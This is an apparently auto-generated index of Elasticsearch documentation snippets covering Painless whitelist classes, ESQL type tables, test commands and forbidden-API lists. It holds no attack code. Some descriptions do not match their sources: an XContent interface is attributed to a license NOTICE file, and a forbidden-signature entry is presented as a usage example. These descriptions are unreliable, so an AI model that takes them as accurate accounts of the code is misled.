This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `SHA256` [esql-sha256]\n```\n\n----------------------------------------\n\nTITLE: Method Call Grammar Definition in Painless\nDESCRIPTION: Grammar specification for method call operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nmethod_call: '.' ID arguments;\narguments: '(' (expression (',' expression)*)? ')';\n```\n\n----------------------------------------\n\nTITLE: Defining Test Parameters for ESQL Function in Elasticsearch\nDESCRIPTION: This snippet defines the parameters for an ESQL function test case. It specifies the 'input' parameter, which is the input to be hashed by the function being tested.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/md5.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`input`\n:   Input to hash.\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.List Methods in Painless\nDESCRIPTION: This snippet outlines methods for the java.util.List interface, which includes functionalities for managing ordered collections. It supports operations such as element retrieval, modification, and sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.List {\n  void add(int,def)\n  boolean addAll(int,Collection)\n  boolean equals(Object)\n  def get(int)\n  int hashCode()\n  int indexOf(def)\n  int lastIndexOf(def)\n  ListIterator listIterator()\n  ListIterator listIterator(int)\n  def remove(int)\n  void replaceAll(UnaryOperator)\n  def set(int,def)\n  int org.elasticsearch.painless.api.Augmentation getLength()\n  void sort(Comparator)\n  List subList(int,int)\n  Object org.elasticsearch.painless.api.Augmentation getByPath(String)\n  Object org.elasticsearch.painless.api.Augmentation getByPath(String, Object)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Geometry Field Script Classes\nDESCRIPTION: Declares whitelist classes for runtime geometry field scripting with specific import restrictions\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.geometry_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.GeometryFieldScript @no_import {\n}\nclass org.elasticsearch.script.GeometryFieldScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Metadata Operations Class Definition\nDESCRIPTION: Defines methods for accessing and modifying document metadata like index, id, routing, and version information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ingest.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.Metadata {\n    String getIndex()\n    void setIndex(String)\n\n    String getId()\n    void setId(String)\n\n    String getRouting()\n    void setRouting(String)\n\n    long getVersion()\n    void setVersion(long)\n\n    String getVersionType()\n    void setVersionType(String)\n\n    ZonedDateTime getNow()\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Parameter definition block for a `number` parameter with no additional description provided. This appears to be part of an automated test case documentation generation system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/std_dev.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   \n```\n\n----------------------------------------\n\nTITLE: Faster Tests Command - Shell\nDESCRIPTION: This shell command modifies the end-to-end testing command by adding a flag for small data size, allowing for quicker testing processes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=notion DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Type Combinations for ESQL Function in Markdown\nDESCRIPTION: A markdown table showing the supported type combinations for an ESQL function. It lists the left-hand side (lhs) type, right-hand side (rhs) type, and the resulting type for each supported combination.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/add.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| date | date_period | date |\n| date | time_duration | date |\n| date_nanos | date_period | date_nanos |\n| date_nanos | time_duration | date_nanos |\n| date_period | date | date |\n| date_period | date_nanos | date_nanos |\n| date_period | date_period | date_period |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| integer | double | double |\n| integer | integer | integer |\n| integer | long | long |\n| long | double | double |\n| long | integer | long |\n| long | long | long |\n| time_duration | date | date |\n| time_duration | date_nanos | date_nanos |\n| time_duration | time_duration | time_duration |\n| unsigned_long | unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Type Conversion Table in Markdown\nDESCRIPTION: Markdown table documenting supported numeric type conversions showing that double, integer, long, and unsigned_long types all convert to double type output. This appears to be auto-generated documentation for an ESQL function implementation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/acos.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n| unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: ESQL Numeric Type Combinations Matrix\nDESCRIPTION: A markdown table defining the supported numeric type combinations and their resulting types. Shows how different numeric types (double, integer, long, unsigned_long) interact with decimal parameters in ESQL functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/round.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | decimals | result |\n| --- | --- | --- |\n| double | integer | double |\n| double | long | double |\n| double | | double |\n| integer | integer | integer |\n| integer | long | integer |\n| integer | | integer |\n| long | integer | long |\n| long | long | long |\n| long | | long |\n| unsigned_long | integer | unsigned_long |\n| unsigned_long | long | unsigned_long |\n| unsigned_long | | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Type Mappings in Markdown\nDESCRIPTION: A markdown table showing the mapping between field types and their corresponding result types in ESQL. This table is automatically generated and lists all supported data types including primitive types, geometric types, and special Elasticsearch types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_last.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | cartesian_point |\n| cartesian_shape | cartesian_shape |\n| date | date |\n| date_nanos | date_nanos |\n| double | double |\n| geo_point | geo_point |\n| geo_shape | geo_shape |\n| integer | integer |\n| ip | ip |\n| keyword | keyword |\n| long | long |\n| text | keyword |\n| unsigned_long | unsigned_long |\n| version | version |\n```\n\n----------------------------------------\n\nTITLE: DateTimeException Constructor\nDESCRIPTION: Details the constructor for the java.time.DateTimeException. This shows the exception class used within the java.time package for handling date and time related errors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_20\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.DateTimeException {\n  (String)\n}\"\n```\n\n----------------------------------------\n\nTITLE: Describing ST_CONTAINS Function in ESQL\nDESCRIPTION: This snippet provides a markdown description of the ST_CONTAINS function in Elasticsearch SQL. It explains that the function checks if the first geometry contains the second geometry and notes that it is the inverse of the ST_WITHIN function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/st_contains.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns whether the first geometry contains the second geometry. This is the inverse of the [ST_WITHIN](/reference/query-languages/esql/functions-operators/spatial-functions.md#esql-st_within) function.\n```\n\n----------------------------------------\n\nTITLE: Skipping Tests with Required Capabilities\nDESCRIPTION: Shows how to skip CSV-SPEC tests for specific node capabilities to handle version compatibility\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/testFixtures/src/main/resources/README.md#2025-04-21_snippet_3\n\nLANGUAGE: csv-spec\nCODE:\n```\nmvSlice\nrequired_capability: mv_sort\nrequired_capability: mv_slice\n\nrow a = [true, false, false, true]\n| eval a1 = mv_slice(a, 1), a2 = mv_slice(a, 2, 3);\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: A template for the boilerplate notice to be included in project files when applying the Apache License 2.0. It includes placeholders for the copyright year and owner, and specifies the terms of use under the license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/failureaccess-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Conditionally Serializing Data Based on Transport Version in Java\nDESCRIPTION: This Java snippet demonstrates reading data from a stream (`StreamInput`) and conditionally reading an additional integer (`num`) only if the current transport version (`in.getTransportVersion()`) is at or after a newly defined constant (`TransportVersions.NEW_CONSTANT`). This pattern ensures backward compatibility when introducing serialization changes, allowing newer nodes to read data serialized by older nodes and vice-versa within compatibility limits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/Versioning.md#_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nstr = in.readString();\nbool = in.readBoolean();\nif (in.getTransportVersion().onOrAfter(TransportVersions.NEW_CONSTANT)) {\n    num = in.readVInt();\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Parameters for Spaces Function Test in Elasticsearch SQL\nDESCRIPTION: This markdown snippet defines the parameters for the 'spaces' function test case. It specifies that the function takes a 'number' parameter, which determines the number of spaces in the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/space.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`number`\n:   Number of spaces in result.\n```\n\n----------------------------------------\n\nTITLE: Documenting Version class\nDESCRIPTION: This snippet documents the `Version` class which appears to encapsulate a version.  It has a constructor that accepts a string argument, likely representing the version string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/mapper-version/src/main/resources/org/elasticsearch/xpack/versionfield/org.elasticsearch.xpack.versionfield.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.versionfield.Version {\n    (String)\n}\n```\n\n----------------------------------------\n\nTITLE: GC Generations Metric Example\nDESCRIPTION: This snippet demonstrates a case where including a finite and fixed set of names directly in the metric name is acceptable, using \"young\" and \"old\" as examples for GC generations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_2\n\nLANGUAGE: none\nCODE:\n```\n\"young\"\n```\n\nLANGUAGE: none\nCODE:\n```\n\"old\"\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types Table for ESQL Function in Markdown\nDESCRIPTION: This snippet presents a markdown table defining the supported input and output types for an ESQL function. It shows that the function accepts 'ip' as the first parameter, 'keyword' or 'text' as the second parameter, and returns a boolean result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/cidr_match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| ip | blockX | result |\n| --- | --- | --- |\n| ip | keyword | boolean |\n| ip | text | boolean |\n```\n\n----------------------------------------\n\nTITLE: Skipping tests based on distribution compatibility in Java\nDESCRIPTION: This snippet demonstrates how to use JUnit's `assumeTrue` method to skip a test if the distribution being tested is not compatible with the current platform. The `distribution.packaging.compatible` flag indicates whether the distribution is compatible.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/qa/packaging/README.md#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n```java\nassumeTrue(distribution.packaging.compatible);\n```\n```\n\n----------------------------------------\n\nTITLE: Defining XContent Interface in Java for Elasticsearch\nDESCRIPTION: This snippet defines the XContent interface, which is a core part of Elasticsearch's content handling API. It includes methods for creating parsers and generators, as well as utility methods for content type management.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-ec2/licenses/slf4j-nop-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic interface XContent {\n\n    /**\n     * The type that the xcontent handles.\n     */\n    XContentType type();\n\n    /**\n     * Creates a new {@link XContentParser}.\n     */\n    XContentParser createParser(NamedXContentRegistry xContentRegistry,\n                                DeprecationHandler deprecationHandler, String content) throws IOException;\n\n    /**\n     * Creates a new {@link XContentParser}.\n     */\n    XContentParser createParser(NamedXContentRegistry xContentRegistry,\n                                DeprecationHandler deprecationHandler, InputStream is) throws IOException;\n\n    /**\n     * Creates a new {@link XContentParser}.\n     */\n    XContentParser createParser(NamedXContentRegistry xContentRegistry,\n                                DeprecationHandler deprecationHandler, byte[] data) throws IOException;\n\n    /**\n     * Creates a new {@link XContentParser}.\n     */\n    XContentParser createParser(NamedXContentRegistry xContentRegistry,\n                                DeprecationHandler deprecationHandler, byte[] data, int offset, int length) throws IOException;\n\n    /**\n     * Creates a new {@link XContentParser}.\n     */\n    XContentParser createParser(NamedXContentRegistry xContentRegistry,\n                                DeprecationHandler deprecationHandler, BytesReference bytes) throws IOException;\n\n    /**\n     * Creates a new {@link XContentParser}.\n     */\n    XContentParser createParser(NamedXContentRegistry xContentRegistry,\n                                DeprecationHandler deprecationHandler, Reader reader) throws IOException;\n\n    /**\n     * Creates a new {@link XContentGenerator}.\n     */\n    XContentGenerator createGenerator(OutputStream os) throws IOException;\n\n    /**\n     * Creates a new {@link XContentGenerator}.\n     */\n    XContentGenerator createGenerator(Writer writer) throws IOException;\n\n    /**\n     * Returns true if the content type is binary.\n     */\n    boolean isBinary();\n\n    /**\n     * Verify that the given {@link BytesReference} is of type {@link #type()}.\n     * Use {@link #detect(BytesReference)} if you don't know the type beforehand\n     * and want to detect it.\n     */\n    void checkHeaderOrNull(BytesReference bytes);\n\n    /**\n     * Detect the content type from the given bytes, or {@code null} if can't be detected.\n     */\n    static XContentType detect(BytesReference bytes) {\n        return XContentFactory.xContentType(Objects.requireNonNull(bytes));\n    }\n\n    /**\n     * Detect the content type from the given string content, or {@code null} if can't be detected.\n     */\n    static XContentType detect(String content) {\n        return XContentFactory.xContentType(content);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Emit Callback in Painless for Double Fields\nDESCRIPTION: This snippet defines a static import for the `emit` callback which collects values that are bound to `DoubleFieldScript` instances. It allows users to emit double values when script execution occurs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.double_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nstatic_import {\n    # The `emit` callback to collect values for the field\n    void emit(org.elasticsearch.script.DoubleFieldScript, double) bound_to org.elasticsearch.script.DoubleFieldScript$Emit\n}\n```\n\n----------------------------------------\n\nTITLE: Convert Functions in SQL Group By\nDESCRIPTION: Examples of CONVERT functions used in GROUP BY clauses with date/time extractions and type casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CONVERT(ABS(EXTRACT(YEAR FROM date)), SQL_BIGINT)\nFROM test\nGROUP BY CONVERT(ABS(EXTRACT(YEAR FROM date)), SQL_BIGINT)\nORDER BY CONVERT(ABS(EXTRACT(YEAR FROM date)), SQL_BIGINT) NULLS FIRST;\n```\n\nLANGUAGE: json\nCODE:\n```\nInternalSqlScriptUtils.cast(InternalSqlScriptUtils.abs(InternalSqlScriptUtils.dateTimeExtract(InternalQlScriptUtils.docValue(doc,params.v0),params.v1,params.v2)),params.v3)\n```\n\n----------------------------------------\n\nTITLE: Defining Temporal Classes and Interfaces in Painless - Java\nDESCRIPTION: This snippet defines various temporal classes and their methods from the java.time package for the Painless scripting context. Each class like Temporal, TemporalAccessor, and various fields and units are specified, facilitating operations such as adjustments, additions, and queries on temporal data. Dependencies include the java.time.temporal package. It's primarily used for date-time calculations and manipulations in scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.temporal.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.Temporal {\n  Temporal minus(long,TemporalUnit)\n  Temporal minus(TemporalAmount)\n  Temporal plus(long,TemporalUnit)\n  Temporal plus(TemporalAmount)\n  long until(Temporal,TemporalUnit)\n  Temporal with(TemporalAdjuster)\n  Temporal with(TemporalField,long)\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalAccessor {\n  int get(TemporalField)\n  long getLong(TemporalField)\n  boolean isSupported(TemporalField)\n  def query(TemporalQuery)\n  ValueRange range(TemporalField)\n  # An easy method to convert temporalAccessors to millis since epoch similar to Instant#toEpochMilli.\n  long org.elasticsearch.painless.api.Augmentation toEpochMilli()\n  long org.elasticsearch.painless.api.Augmentation getMillis()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalAdjuster {\n  Temporal adjustInto(Temporal)\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalAmount {\n  Temporal addTo(Temporal)\n  long get(TemporalUnit)\n  List getUnits()\n  Temporal subtractFrom(Temporal)\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalField {\n  Temporal adjustInto(Temporal,long)\n  TemporalUnit getBaseUnit()\n  String getDisplayName(Locale)\n  long getFrom(TemporalAccessor)\n  TemporalUnit getRangeUnit()\n  boolean isDateBased()\n  boolean isSupportedBy(TemporalAccessor)\n  boolean isTimeBased()\n  ValueRange range()\n  ValueRange rangeRefinedBy(TemporalAccessor)\n  TemporalAccessor resolve(Map,TemporalAccessor,ResolverStyle)\n  String toString()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalQuery {\n  def queryFrom(TemporalAccessor)\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalUnit {\n  Temporal addTo(Temporal,long)\n  long between(Temporal,Temporal)\n  Duration getDuration()\n  boolean isDateBased()\n  boolean isDurationEstimated()\n  boolean isSupportedBy(Temporal)\n  boolean isTimeBased()\n  String toString()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.IsoFields {\n  TemporalField DAY_OF_QUARTER\n  TemporalField QUARTER_OF_YEAR\n  TemporalUnit QUARTER_YEARS\n  TemporalField WEEK_BASED_YEAR\n  TemporalUnit WEEK_BASED_YEARS\n  TemporalField WEEK_OF_WEEK_BASED_YEAR\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.JulianFields {\n  TemporalField JULIAN_DAY\n  TemporalField MODIFIED_JULIAN_DAY\n  TemporalField RATA_DIE\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalAdjusters {\n  TemporalAdjuster dayOfWeekInMonth(int,DayOfWeek)\n  TemporalAdjuster firstDayOfMonth()\n  TemporalAdjuster firstDayOfNextMonth()\n  TemporalAdjuster firstDayOfNextYear()\n  TemporalAdjuster firstDayOfYear()\n  TemporalAdjuster firstInMonth(DayOfWeek)\n  TemporalAdjuster lastDayOfMonth()\n  TemporalAdjuster lastDayOfYear()\n  TemporalAdjuster lastInMonth(DayOfWeek)\n  TemporalAdjuster next(DayOfWeek)\n  TemporalAdjuster nextOrSame(DayOfWeek)\n  TemporalAdjuster ofDateAdjuster(UnaryOperator)\n  TemporalAdjuster previous(DayOfWeek)\n  TemporalAdjuster previousOrSame(DayOfWeek)\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.TemporalQueries {\n  TemporalQuery chronology()\n  TemporalQuery localDate()\n  TemporalQuery localTime()\n  TemporalQuery offset()\n  TemporalQuery precision()\n  TemporalQuery zone()\n  TemporalQuery zoneId()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.ValueRange {\n  int checkValidIntValue(long,TemporalField)\n  long checkValidValue(long,TemporalField)\n  long getLargestMinimum()\n  long getMaximum()\n  long getMinimum()\n  long getSmallestMaximum()\n  boolean isFixed()\n  boolean isIntValue()\n  boolean isValidIntValue(long)\n  boolean isValidValue(long)\n  ValueRange of(long,long)\n  ValueRange of(long,long,long)\n  ValueRange of(long,long,long,long)\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.WeekFields {\n  WeekFields ISO\n  WeekFields SUNDAY_START\n  TemporalUnit WEEK_BASED_YEARS\n  TemporalField dayOfWeek()\n  DayOfWeek getFirstDayOfWeek()\n  int getMinimalDaysInFirstWeek()\n  WeekFields of(DayOfWeek,int)\n  WeekFields of(Locale)\n  TemporalField weekBasedYear()\n  TemporalField weekOfMonth()\n  TemporalField weekOfWeekBasedYear()\n  TemporalField weekOfYear()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.ChronoField {\n  ChronoField ALIGNED_DAY_OF_WEEK_IN_MONTH\n  ChronoField ALIGNED_DAY_OF_WEEK_IN_YEAR\n  ChronoField ALIGNED_WEEK_OF_MONTH\n  ChronoField ALIGNED_WEEK_OF_YEAR\n  ChronoField AMPM_OF_DAY\n  ChronoField CLOCK_HOUR_OF_AMPM\n  ChronoField CLOCK_HOUR_OF_DAY\n  ChronoField DAY_OF_MONTH\n  ChronoField DAY_OF_WEEK\n  ChronoField DAY_OF_YEAR\n  ChronoField EPOCH_DAY\n  ChronoField ERA\n  ChronoField HOUR_OF_AMPM\n  ChronoField HOUR_OF_DAY\n  ChronoField INSTANT_SECONDS\n  ChronoField MICRO_OF_DAY\n  ChronoField MICRO_OF_SECOND\n  ChronoField MILLI_OF_DAY\n  ChronoField MILLI_OF_SECOND\n  ChronoField MINUTE_OF_DAY\n  ChronoField MINUTE_OF_HOUR\n  ChronoField MONTH_OF_YEAR\n  ChronoField NANO_OF_DAY\n  ChronoField NANO_OF_SECOND\n  ChronoField OFFSET_SECONDS\n  ChronoField PROLEPTIC_MONTH\n  ChronoField SECOND_OF_DAY\n  ChronoField SECOND_OF_MINUTE\n  ChronoField YEAR\n  ChronoField YEAR_OF_ERA\n  int checkValidIntValue(long)\n  long checkValidValue(long)\n  ChronoField valueOf(String)\n  ChronoField[] values()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.ChronoUnit {\n  ChronoUnit CENTURIES\n  ChronoUnit DAYS\n  ChronoUnit DECADES\n  ChronoUnit ERAS\n  ChronoUnit FOREVER\n  ChronoUnit HALF_DAYS\n  ChronoUnit HOURS\n  ChronoUnit MICROS\n  ChronoUnit MILLENNIA\n  ChronoUnit MILLIS\n  ChronoUnit MINUTES\n  ChronoUnit MONTHS\n  ChronoUnit NANOS\n  ChronoUnit SECONDS\n  ChronoUnit WEEKS\n  ChronoUnit YEARS\n  ChronoUnit valueOf(String)\n  ChronoUnit[] values()\n}\n```\n\nLANGUAGE: Java\nCODE:\n```\nclass java.time.temporal.UnsupportedTemporalTypeException {\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining FieldScript Class in Java\nDESCRIPTION: This snippet defines the FieldScript class used in the Elasticsearch scripting API. It is necessary for whitelisting scripts to enable the painless scripting engine to correctly find and validate the classes for the field API. There are no specific parameters or outputs as this is a class definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.field.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.FieldScript @no_import {\n}\nclass org.elasticsearch.script.FieldScript @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ZoneOffsetTransition Class Methods\nDESCRIPTION: Defines the structure and methods of the ZoneOffsetTransition class for handling time zone offset transitions. Includes methods for comparing transitions, getting date/time information, and checking transition validity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.zone.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.zone.ZoneOffsetTransition {\n  int compareTo(ZoneOffsetTransition)\n  LocalDateTime getDateTimeAfter()\n  LocalDateTime getDateTimeBefore()\n  Duration getDuration()\n  Instant getInstant()\n  ZoneOffset getOffsetAfter()\n  ZoneOffset getOffsetBefore()\n  boolean isGap()\n  boolean isOverlap()\n  boolean isValidOffset(ZoneOffset)\n  ZoneOffsetTransition of(LocalDateTime,ZoneOffset,ZoneOffset)\n  long toEpochSecond()\n}\n```\n\n----------------------------------------\n\nTITLE: Output Format of the Public Callers Finder Tool\nDESCRIPTION: Describes the output format generated by the Public Callers Finder tool after execution. The resultant CSV file contains entries for each method call found, with specified columns detailing the module name, line number, and the original caller's details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/public-callers-finder/README.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n1. Module name\n2. File name (from source root)\n3. Line number\n4. Fully qualified class name (ASM style, with `/` separators)\n5. Method name\n6. Method descriptor (ASM signature)\n7. Visibility (PUBLIC/PUBLIC-METHOD/PRIVATE)\n8. Original caller Module name\n9. Original caller Class name (ASM style, with `/` separators)\n10. Original caller Method name\n11. Original caller Visibility\n```\n\n----------------------------------------\n\nTITLE: Including Parameter Documentation for CATEGORIZE Function in Markdown\nDESCRIPTION: Markdown code to include the parameter documentation for the CATEGORIZE function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/categorize.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/categorize.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Running All EQL Integration Tests\nDESCRIPTION: These commands run the ElasticSearch EQL integration correctness tests using Gradle. The first command runs tests in a specific QA module, while the second command runs tests in the overall EQL module.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew -p x-pack/plugin/eql/qa/correctness check\n```\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew -p x-pack/plugin/eql check\n```\n\n----------------------------------------\n\nTITLE: Sending Basic HTTP Request - Java\nDESCRIPTION: This snippet illustrates a simple method to send an HTTP request using the Nimbus SDK. It is designed for straightforward use cases where no custom security settings are required.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/oidc-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\ncom.nimbusds.oauth2.sdk.http.HTTPRequest#send()\n```\n\n----------------------------------------\n\nTITLE: Defining DateTimeParseException Class in Java\nDESCRIPTION: The DateTimeParseException class represents an exception that occurs during date-time parsing errors. It includes information about the error index within the input string and provides the string that was being parsed, facilitating error handling during format operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.DateTimeParseException {\n  (String,CharSequence,int)\n  int getErrorIndex()\n  String getParsedString()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BytesRefSortScript Class for Whitelisting\nDESCRIPTION: This snippet defines the class org.elasticsearch.script.BytesRefSortScript, used for sorting in scripts. It is whitelisted to allow scripts to access sorting capabilities based on byte references in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.bytesref_sort.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.BytesRefSortScript @no_import {\n}\n\n```\n\n----------------------------------------\n\nTITLE: Restricted Scheduled Thread Pool Executor Creation\nDESCRIPTION: Restricts direct usage of ScheduledThreadPoolExecutor, recommending Elasticsearch's SafeScheduledThreadPoolExecutor instead for proper error handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_7\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage extend org.elasticsearch.threadpool.Scheduler.SafeScheduledThreadPoolExecutor instead which will properly bubble up Errors\njava.util.concurrent.ScheduledThreadPoolExecutor#<init>(int)\njava.util.concurrent.ScheduledThreadPoolExecutor#<init>(int, java.util.concurrent.ThreadFactory)\njava.util.concurrent.ScheduledThreadPoolExecutor#<init>(int, java.util.concurrent.RejectedExecutionHandler)\njava.util.concurrent.ScheduledThreadPoolExecutor#<init>(int, 